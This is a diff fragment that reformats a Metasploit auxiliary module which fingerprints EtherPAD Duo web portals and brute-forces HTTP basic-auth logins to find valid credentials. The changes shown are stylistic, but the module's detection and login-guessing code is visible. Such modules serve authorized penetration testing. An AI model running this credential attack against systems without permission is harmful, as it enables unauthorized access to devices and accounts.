@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,27 +12,24 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-    'Name'           => 'EtherPAD Duo Login Bruteforce Utility',
-    'Description'    => %{
-      This module scans for EtherPAD Duo login portal, and
-      performs a login bruteforce attack to identify valid credentials.
-    },
-    'Author'         =>
-      [
-        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
-      ],
-    'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'EtherPAD Duo Login Bruteforce Utility',
+                      'Description'    => %(
+                        This module scans for EtherPAD Duo login portal, and
+                        performs a login bruteforce attack to identify valid credentials.
+                      ),
+                      'Author'         =>
+                        [
+                          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+                        ],
+                      'License'        => MSF_LICENSE))
 
     deregister_options('HttpUsername', 'HttpPassword')
   end
 
-  def run_host(ip)
-    unless is_app_epaduo?
-      return
-    end
+  def run_host(_ip)
+    return unless is_app_epaduo?
 
     print_status("Starting login bruteforce...")
     each_user_pass do |user, pass|
@@ -46,19 +44,18 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_epaduo?
     begin
       res = send_request_cgi(
-      {
         'uri'       => normalize_uri('/', 'CGI', 'mParseCGI'),
         'method'    => 'GET',
         'vars_get'  => {
           'file' => 'mainpage.html'
         }
-      })
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       vprint_error("HTTP Connection Failed...")
       return false
     end
 
-    if (res and res.code == 200 and res.headers['Server'] =~ /EtherPAD/ and res.body.include?("EtherPAD Duo"))
+    if res && (res.code == 200) && res.headers['Server'] =~ /EtherPAD/ && res.body.include?("EtherPAD Duo")
       vprint_good("Running EtherPAD Duo application ...")
       return true
     else
@@ -103,11 +100,10 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-      {
-        'uri'       => normalize_uri('/', 'config', 'configindex.ehtml'),
-        'method'    => 'GET',
+        'uri' => normalize_uri('/', 'config', 'configindex.ehtml'),
+        'method' => 'GET',
         'authorization' => basic_auth(user, pass)
-      })
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       vprint_error("HTTP Connection Failed...")
       return :abort
